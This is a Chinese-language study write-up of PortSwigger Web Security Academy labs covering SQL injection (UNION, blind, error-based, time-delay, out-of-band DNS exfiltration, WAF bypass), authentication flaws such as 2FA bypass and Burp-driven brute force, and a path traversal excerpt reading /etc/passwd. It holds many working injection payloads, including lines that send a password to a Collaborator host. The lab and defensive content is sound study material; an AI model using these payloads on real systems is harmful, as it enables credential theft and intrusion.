---
title: PortSwigger_Server_Side
permalink: /PortSwigger_Server_Side
category: 信息安全
tag:
  - 信息安全
  - 渗透测试
  - PortSwigger
author: xmy

---



PortSwigger 网站和 BurpSuite 实验记录，网站地址：https://portswigger.net/  





# SQL Injection

在前端输入框、组件中，可以输入参数的地方，通过关键字、注释符等，导致后端处理 SQL 时执行非正常逻辑，从而泄露数据、被篡改数据等。  

例如 order by 从句、group by 从句、where 从句、-- 注释符、union 联合查询

  

Portswigger Academy 相关示例：

## retrieving hidden data 隐藏数据



web 应用中通过标签获选项筛选产品分类，再通过 url 将参数传递给后端：  

`https://insecure-website.com/products?category=Gifts`

服务端接收到请求后，转化为如下SQL，从 products 表中查询商品，released = 1 表示发布的商品 ：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

 攻击者可以修改url为：
`https://insecure-website.com/products?category=Gifts'--`

这导致后端查询的SQL变为

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

由于 -- 注释了后面的 AND 语句导致其不生效，未 release 的产品也会被返回。  







## subverting application logic 破坏逻辑

示例是用户名密码登录框，输入用户名 wiener 密码 bluecheese  

服务端将请求转换为如下SQL：

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

如果在用户名填入 `administrator'--`，则将SQL逻辑修改为：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```



## UNION attacks 联合注入

数据库关键字 UNION 可以实现联合查询，例如查询两个表中数据

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

### 探测方法：order by、NULL 值等

通过一些手段可以探测到字段数量

* ORDER BY 逐步测试

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

![image-20260717100622069](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717100622069.png)

当超过该表的字段，数据库会返回类似如下错误：

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

网页端则可能有 5xx 类型错误。

![image-20260717100706866](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717100706866.png)





* UNION SELECT 不断增加 NULL 占位去探测，这里利用了 NULL 会适配所有类型的数据库字段

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

当超出之后会有类似报错：

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```



### 探测字段类型

确认了字段数量后，可以使用占位符去探测出一些字段的数据类型，这里将 'a' 逐个替换掉每个字段，来观察返回的值或者错误：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

通常不兼容的字段会导致数据库返回错误：

```
Conversion failed when converting the varchar value 'a' to data type int.
```

当没有类似报错说明该字段兼容或能适配传入字符、字符串，可以利用其检索一些关键字。  

![image-20260717101700755](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717101700755.png)

当检索出字段兼容的属性后，可以替换为我们想要检索的关键字再尝试：

![image-20260717101851225](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717101851225.png)



### 联合查询其它 table

实验中假设已知 users 表有 username、password 字段，尝试通过页面注入 union select 查询该表数据：

https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+select+username,password+from+users--

![image-20260717102509511](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717102509511.png)







### 探测数据库信息

可以利用上面方法和数据库的一些常用 table、关键字 来查询数据库的信息，包括版本、表名称、表结构等等。  

一些常用数据库 SQL 拼接、信息查询语句：https://portswigger.net/web-security/sql-injection/cheat-sheet



查询 MySQL 数据库版本信息实验：

![image-20260717104703117](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717104703117.png)



### 通过 content、表结构检索出用户信息实验



检索所有表：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+table_name,+NULL+FROM+information_schema.tables--


检索出疑似用户表名：users_oyqdgq

检索该表字段：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+COLUMN_NAME,+DATA_TYPE+FROM+information_schema.columns+where+table_name='users_oyqdgq'--


检索出疑似用户名及密码字段：username_purobl、password_piucuh

检索 administrator 的密码：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+username_purobl,+password_piucuh+FROM+users_oyqdgq+where+username_purobl='administrator'--

最终检索出 administrator 用户密码：

![image-20260717114407921](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717114407921.png)

Oracle 数据库实验，主要是默认库表名称不同：
https://0a2ssssssssssssssssssssssss9.web-security-academy.net/filter?category=Pets%27+union+select+table_name,+NULL+FROM+all_tables--

疑似表：USERS_NLUNDL
有多个疑似表不确定的情况下，可以使用字段名和表名再多查询一些信息
https://0sssssssssssss10099.web-security-academy.net/filter?category=Pets%27+union+select+COLUMN_NAME,+TABLE_NAME+FROM+all_tab_columns--

https://0asssssssssssssssss00510099.web-security-academy.net/filter?category=Pets%27+union+select+COLUMN_NAME,+TABLE_NAME+FROM+all_tab_columns+where+TABLE_NAME+=+'USERS_NLUNDL'--



疑似字段：USERNAME_XBWGGY、PASSWORD_OYNUZF

https://sssssssssssssssss99.web-security-academy.net/filter?category=Pets%27+union+select+USERNAME_XBWGGY,+PASSWORD_OYNUZF+FROM+USERS_NLUNDL+where+USERNAME_XBWGGY+=+'administrator'--







### 通过单字段检索多个值

数据库有一些字符串拼接的语法可以使用，例如 oracle ：

```
' UNION SELECT username || '~' || password FROM users--
```

通过单字段位查询多个值，返回类似如下内容，username、password 被 ~ 分隔：

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

常见数据库拼接语法：

| Oracle     | `'foo'||'bar'`                                               |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [注意两个字符串之间有空格] 或者 `CONCAT('foo','bar')` |



portswigger 实验：

已知 users 表，字段有 username、password，找出 administrator 用户密码：  

探测出第二个字段可以传递字符，这里使用 )) 作为分隔符：

https://xxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+select+null,username||'))'||password+from+users+where+username='administrator'--







## Blind SQL Injection 盲注

盲注是指应用包含 SQL Injection 漏洞，但是 HTTP 返回的内容不包含相关 SQL 结果。UNION attacks 在这种情况下很难有效果。  



conditional responses

portswigger示例：

假设一个网站使用如下 http header 跟踪用户习惯：

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

 在用户请求后会被服务端转换为如下数据库查询：

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

如果存在此 ID，web 页面返回一个 “welcome back”之类的提示展示给用户，反正则没有。此信息就可以用来探测，参考如下：

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

* 第一条注入为真，页面会展示信息
* 第二条注入为假，页面不会展示



将上面逻辑转换为想要探测的信息，组装出对应 SQL，例如已知 Users 表中有 Username、Password 字段，可以通过逐个字符猜测来拼凑出对应密码，注入如下内容

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

如果为 true，说明第一个字符大于 m，继续探测：

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

为 true 说明大于 t，继续探测

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

反复循环直到探测出完整的密码。    

常见 substring 语法，下标从 1 开始，下面的示例返回 ba 字符串：

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |





练习：

>
>
>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.



确认表名是否为 users：
' AND (SELECT 'a' FROM users LIMIT 1)='a

确认用户名是否为 administrator：
' AND (SELECT 'a' FROM users WHERE username = 'administrator')='a


确认 password 长度，这里使用 Burp Suite 的 Repeater，最终确认为 20：
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a



之后需要反复试每一位密码，需要用到 Burp Suite 的 Intruder 工具，这里使用 substring 函数：
' AND (SELECT substring(password,1,1) FROM users WHERE username = 'administrator')='a



![image-20260717170913151](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170913151.png)

![image-20260717170949179](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170949179.png)



![image-20260717170733072](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170733072.png)







上面探测出第 1 位的值为 u，继续重复这个过程，直到剩余都找到，这里是第二位字符：

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```



可以使用 `Cluster bomb attack` 类型的 Intruder attack，定义 2 个 Payload 位，分别使用不同的值循环测试

![image-20260717174144513](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717174144513.png)

![image-20260717174226051](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717174226051.png)





![image-20260717183906668](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717183906668.png)

根据最终 attack 结果组装出密码：

upc378pc9riff1ahiyya





### Error-based SQL injection

能够触发错误被利用的分为两种类型：

* Exploiting blind SQL injection by triggering conditional errors
  * 类似于前面的条件返回，传入不同条件，返回不同错误
* Extracting sensitive data via verbose SQL error messages
  * 错误信息包含在查询结果中被输出



先看第一种，假设前端 cookie 中包含了 TrackingId，可以被注入如下 SQL：

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

这里使用了 CASE 关键字，根据不同的条件去匹配结果，第一行 1=2 明显错误的条件，使得 语句变为 `'a'='a'` ，不会触发错误。第二行 1=1 导致计算 1/0 触发了除数为 0 的错误。  

利用类似上面的条件，可以将想要查询或者推测的信息，以 CASE 条件的形式传入进去：

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```



不同数据库类型的通过 boolean 条件触发错误语句：

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |



```
Blind SQL injection with conditional errors 的实验

' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'a' END FROM dual)='a


' AND (SELECT CASE WHEN ((SELECT username FROM users)='administrator') THEN 'administrator' ELSE 'a' END FROM dual)='a

' AND (SELECT username FROM users)='administrator


判断用户名和密码、表名等
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

判断密码长度，这里 EXISTS 关键字判断查询结果集是否有数据，后续可以用来 Intruder 猜测密码
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a

猜测密码，将条件修改为 substring(password) 和每一位对比，将 x、y 分别转换为不同的 payload：
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,x,1)='y') THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a


二分法在 repeater 中猜测，手动修改x为1-20，修改条件为>，将y修改为 m，每次替换剩余值一半（例如 m、s、v、x）：
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1)>'m') THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a

hjxxe7wwstrpa85i8pt8


```





Extracting sensitive data via verbose SQL error messages  

有时候配置错误导致详细信息被返回给前端，例如在 id 字段注入一个 `'` 单引号，会产生如下错误：

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

这是由于 id 的值在 WHERE 从句中，单引号被注入该 statement。  

`CAST()` 函数在这种场景中可以被利用来实现一些探测或验证目的，示例如下：  

```
CAST((SELECT example_column FROM example_table) AS int)
```

通常尝试查询的字段是 string ，将其转换为一个不兼容的类型，这里是 int，就导致错误产生：

```
ERROR: invalid input syntax for type integer: "Example data"
```





You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | ------------------------------------------------------------ |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"` |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'` |





错误信息相关实验：

与之前的类似，cookie 中有一个 TrackingId 用来跟踪用户行为，可以注入SQL，返回错误信息。这里之前的 conditional responses 方式注入被拦截，只能通过制造错误信息的形式判断。  

* 先注入一个单引号`Cookie: TrackingId=JE8zrLZCza8lzvM5';`，获得报错  

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'JE8zrLZCza8lzvM5''. Expected  char
```

* 再修改为 `Cookie: TrackingId=JE8zrLZCza8lzvM5'--;`，无报错正常返回数据
* 注入 CAST() 验证语法 `Cookie: TrackingId=JE8zrLZCza8lzvM5' AND CAST(1 AS INT)=1--;` 可以正常返回数据
* 修改上面条件 `Cookie: TrackingId=JE8zrLZCza8lzvM5' AND CAST((SELECT username FROM users) AS INT)=1--;` 尝试验证错误，获得报错：

```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'JE8zrLZCza8lzvM5' AND CAST((SELECT username FROM users) AS I'. Expected  char
```

这里有个坑，卡了很久一直以为是语法错误，实际是传入的 SQL 超过了 cookie 设计的长度限制。

* 将条件修改，可以将 TrackingId= 后面的内容删除以减少长度，``Cookie: TrackingId=' AND CAST((SELECT username FROM users) AS INT)=1--;``，获取到如下报错，说明查询到多条记录：

```
ERROR: more than one row returned by a subquery used as an expression
```

* 再次修改为 `Cookie: TrackingId=' AND CAST((SELECT username FROM users WHERE username='administrator') AS INT)=1--;`，还是超过长度限制
* 继续修改`Cookie: TrackingId=' AND CAST((SELECT username FROM users LIMIT 1) AS INT)=1--;`，这里是实验设计administrator 在第1条，实际中要根据情况调整，获得错误：

```
ERROR: invalid input syntax for type integer: "administrator"
```

* 再次调整获取 password 的内容，`Cookie: TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) AS INT)=1--;`：

```
ERROR: invalid input syntax for type integer: "igi17bo6xv4ab8gly0fw"
```







### triggering time delays

当服务端正确处理错误，就无法利用上面错误响应及报错信息的技术。此时还可以尝试注入延时来判断或验证一些信息：  

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* 第一条不会触发延时
* 第二条会触发延时

基于上面类似的逻辑，可以通过服务器响应的时间来验证或获取信息。  

检索用户信息：

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

```



常见数据库延时 10s 语句：

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

常见数据库条件查询延时语句：

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`               |



实验一，注入SQL让服务器延迟10s返回，修改cookie：

```
Cookie: TrackingId=x'||pg_sleep(10)--; 
```



实验二，通过延迟猜测密码，在 Intruder 中配置 x、y 对应的 payload：

```
Cookie: TrackingId=' || CASE WHEN(SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,x,1)='y')='a' THEN pg_sleep(10) ELSE pg_sleep(0) END--;
```

![image-20260721181900590](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260721181900590.png)

attack 类型要选择 Cluster bomb attack，在所有结果中按照 Response Received 列排序，就可以拼出密码：

![image-20260721182037617](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260721182037617.png)

w9ch9omgsn2lib9hkpf2





### Out-of-band (OAST) 

有些应用可能采用异步执行 SQL 的架构，对外的服务的线程仅接收请求，转发给其它线程执行 SQL。这种场景下前面的注入技术都不能生效，无法获得反馈。  

此时通常会采用 Out-of-band 的形式触发数据回传，绕过正常数据交互流。例如 DNS、邮件等。  

通常很多主机会放行对外的 DNS 请求，因为该协议属于基础设施协议，有很多应用依赖。  

例如 SQL Server 可以通过如下语句触发一个 DNS 请求：

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

该请求会向 `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net` 发送请求，实际中可以替换为攻击者的域名以收集数据。



当找到有效的通道，就可以携带想要查询的数据：

示例：

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```



不同数据库触发 DNS 查询语句：

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`The following technique works on fully patched Oracle installations, but requires elevated privileges:`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`  |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL      | The following techniques work on Windows only:`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |





携带数据的 DNS 查询：

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
| MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |



这两个相关实验需要 pro 会员，暂时跳过。  





### Preventing blind SQL Injection

和预防普通 SQL 注入一样，要小心处理参数化查询的语句，确保用户输入的内容不能拼接、构造出超预期的 SQL 查询。  

示例：

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

```

上面拼接的 SQL  语句可以修改为如下参数化的方式：

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```









## Second-order SQL injection

一级注入是指发生在应用程序通过 HTTP request 接收处理用户请求的时候。  

二级注入是指应用程序接收用户的请求并存储数据，并不立刻处理，而是在满足一定条件后再触发执行，又叫 stored SQL injection。  

通常是开发者意识到 SQL 注入的风险后，在 placeholder 之类的输入框中加入检测及预防手段后再存入数据库。  







## SQL injection in different contexts

在不同场景下可以通过不同方法构造 SQL 注入。例如有些网站使用 xml、json 之类的形式收集数据，并且放置了 WAF 之类的防御设施，可以通过一些特殊编码规则来绕过防火墙检测来注入语句。    

示例，在一段 xml 中注入查询，将其中的 S 字符转移为 16 进制以绕过 WAF 检测：

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

BurpSuite 中有 Decoder 工具，或者使用 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) 插件可以用来做一些不同编码的字符转义。



XML 注入实验：

页面中有一段通过 xml 传入产品id、库存id，点击按钮会向服务端发送 POST 请求，返回对应商品剩余库存数量：

![image-20260722114136662](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722114136662.png)

尝试注入语句，会被 WAF 检测并拦截：

![image-20260722114913880](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722114913880.png)

可以将部分关键字或字符转义以躲避检测：

![image-20260722115023452](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115023452.png)

![image-20260722115055050](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115055050.png)

再替换为想要查询的语句，并可以利用拼接语句查询 `UNION SELECT username || '~' || password FROM users`：

![image-20260722115316041](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115316041.png)









# Authentication vulnerabilities 认证漏洞

## 认证类型

主要有3类：

* something you know ：password、answer to a security question，密码、安全问题，这属于知识因子
* something you have ：mobile phone、security token，手机、安全令牌，这属于资产因子
* something you are ：biometrics、pattern of behavior，生物特征、行为模式，这属于内在因子



## Authentication 和 Authorization  的区别

认证和鉴权：

* Authentication 是指认证，例如账号密码、人脸识别、验证码等。  

* Authorization 是鉴权，认证通过后鉴定用户拥有的权限，是否能够访问某些页面或子系统。





## 认证漏洞产生的原因

主要有2点：

* 认证机制不能防止暴力破解类攻击
* 逻辑漏洞、实现代码质量低导致攻击者能够绕开认证，又称为`Broken Authentication 认证失效` 



## 基于密码认证的脆弱点



* 暴力破解用户名：根据业务不同有所差异，有的会使用 `xxxxxx@company.com` 一类邮箱后缀的账号，使得猜测容易，或者有一些共性的账号：常用的有 root、admin、administrator、support、demo 等
* 暴力破解密码：网站可能强制要求用户设置高复杂度的密码，这样理论上更难破解，但还是有一些规律，例如通常用户更倾向于容易记忆的密码，`mypassword` 不能用就换成 `Mypassword1!` 、`Myp4$$w0rd`之类的
* 用户名枚举：适用于那些验证用户名及密码时，返回了一些信息，可以被利用来确定用户名，例如
  * 状态码
  * 错误消息
  * 响应时间



一些限制暴力破解措施的漏洞：

* IP 封禁：有些应用会检测IP有正常登录后，重置此 IP 的失败计数，会被攻击者利用在暴力破解中插入正常账号登录以绕开此机制
* 账户锁定：超过指定次数后，账号被限制登录一段时间，攻击者可以利用此点来枚举用户名









## 基于多因子认证的脆弱点

多因子主要基于前面所说三种类型，大多数网站或者应用对于生物特征(something you are)难以验证，因此很多时候都采用双因子(something you know、something you have) 2FA 认证，要求同时提供两种认证，常见的有密码+验证码（邮箱、短信、认证APP验证码）。但和其他认证类似，安全程度取决于认证的实现。  



有一些常见的漏洞：

### 绕过校验

密码认证通过后，将用户引导至验证码提交表单页面，但用户状态已经变为登录，此时通过手动输入 url 就可以访问相关页面。



### 认证逻辑漏洞

示例

* 用户发送如下请求，提交表单中的用户名密码

  ```
  POST /login-steps/first HTTP/1.1
  Host: vulnerable-website.com
  ...
  username=carlos&password=qwerty
  ```

  

* 服务器分配一个 cookie 关联到这个账户，返回给用户的验证码页面中包含该 cookie

  ```
  HTTP/1.1 200 OK
  Set-Cookie: account=carlos
  
  GET /login-steps/second HTTP/1.1
  Cookie: account=carlos
  ```

  

* 用户再次提交验证码，cookie 信息被传回服务器，登录到 cookie 关联的账户

  ```
  POST /login-steps/second HTTP/1.1
  Host: vulnerable-website.com
  Cookie: account=carlos
  ...
  verification-code=123456
  ```

* 这里示例的用户是 carlos，cookie 中包含用户信息，但如果第二次没有再校验 cookie 是否与第一次下发的 cookie 一致，黑客可以通过修改 cookie +暴力破解验证码进入其它任意用户的账户，而不需要验证码

  ```
  POST /login-steps/second HTTP/1.1
  Host: vulnerable-website.com
  Cookie: account=victim-user
  ...
  verification-code=123456
  ```

  

### 基于 token 的暴力破解

示例：

网站增加了验证码校验次数，连续几次之后重置验证码并登出用户，以防止暴力破解，但黑客可以通过 burpsuite 之类的工具自动化第一步的登录流程，反复尝试以登录。



在用户第一次登录时 GET 获取登录页面、 POST 提交用户密码、GET 获取验证码页面、POST 提交验证码，在 brupsuite 中将前3步骤作为宏：

![image-20260805120842644](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260805120842644.png)

在第3步中从页面获取到 token ，并在第 4 步中携带反复进行验证码暴力破解

![image-20260805121007306](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260805121007306.png)



![image-20260806000441652](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260806000441652.png)

![image-20260806000552380](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260806000552380.png)



上面实验是 portswigger 故意设计的缺陷，应用没有对账户锁定，OTP 验证也没有暴力破解的防护。



一个 2FA 认证应该做到：

* 验证码一次性
* 有效期短
* 账户在多次错误尝试后应该被锁定或限流





## 其它认证机制的脆弱点



### 保持登录

有一种很常见的功能是保持登录，页面常见的形式是标识着“记住我”、“保持登录”之类的勾选框。通常是生成一个持久化的 cookie ，该 cookie 作为 token 或其一部分传给服务器以通过登录认证环节，这个 cookie 最佳实践应当是有随机性难以猜测出来的。  

但是有些网站实现却将其与一部分用户信息关联拼接，例如用户名+时间戳，甚至有用密码作为其中一部分。因为黑客是很容易通过注册自己的账号来推演相关 cookie 生成过程。  

有的网站对这些值进行了加密，但如果加密方式比较简单，例如 base64 这种双向加密形式则无法提供任何防护。甚至使用单向加密方式，如果未加 salt ，黑客知道了加密算法，可以通过加密词表对 cookie 进行暴力破解。   



有些网站虽然黑客无法创建账号，但可以利用类似 XSS 之类的技术，获取用户的 cookie ，如果恰好网站应用使用开源的框架，该 cookie 的构造方式可能已经公开。  



### 重置密码

实际应用中用户可能会忘记密码，因此通常会提供一种重置密码的功能，实现有多种方式，安全措施及风险也不相同。  

* 通过邮件发送密码
  * 这种方式生成的密码应当具有很短的时效性，或者用户能够立即更改密码。
* 使用 URL 重置密码
  * 这种方案相对前一种安全，但如果生成的 URL 具有一定规律导致容易猜测，则黑客可以通过此种方式重置任意用户的密码，例如：`http://vulnerable-website.com/reset-password?user=victim-user`
  * 更可靠的实现是发送复杂、难以猜测的 URL ，不包含用户信息，且有较短的时限，用户重置后立即失效，例如 `http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8`
  * 此方式还存在密码重置链接投毒的风险
    * 通过修改 http 头(例如 X-Forwarded-Host:  )、dangling markup 之类漏洞



### 修改密码

通常修改密码功能的流程和登录类似，因此也存在类似风险。如果允许未登录情况下访问该功能页面，也会存在暴力破解密码的漏洞。  











## OAuth 认证的脆弱点

有一个专题，暂时先跳过
https://portswigger.net/web-security/oauth





## 增强认证安全

虽然无法面面俱到，仍有一些原则可以帮助我们提高安全性：

* 妥善保管用户凭证
* 不要依赖用户保障安全性
* 预防用户名枚举
* 强有力的防护暴力破解措施
* 反复核对你的验证逻辑
* 不要忘记增补的功能模块
* 实现适当的多因子认证







# Path traversal 目录遍历(路径穿越)

Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿越、路径遍历，会导致攻击者读取服务器上的任意数据，可能包括：代码和数据、后端凭证、系统敏感文件。一些场景中还可以写入文件，导致修改应用数据或者属性，最终拿到服务器权限。  

下面是一些常见的漏洞：

* 经过路径读取任意文件
  * 例如：代码中使用`<img src="/loadImage?filename=218.png">`来展示存放在`/var/www/html`中的图片，如果没有合适的权限配置，可能导致攻击者通过 `https://insecure-website.com/loadImage?filename=../../../etc/passwd` 一类的URL请求以 `/var/www/images/../../../etc/passwd` 这种形式访问但敏感文件。基于windows的可能使用`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini` 这种形式。
* 一些应用使用了一些常见的手段防御，但存在可以绕过的漏洞
* 限制了相对路径
  * 但是使用绝对路径访问，例如参数为 `filename=/etc/passwd`
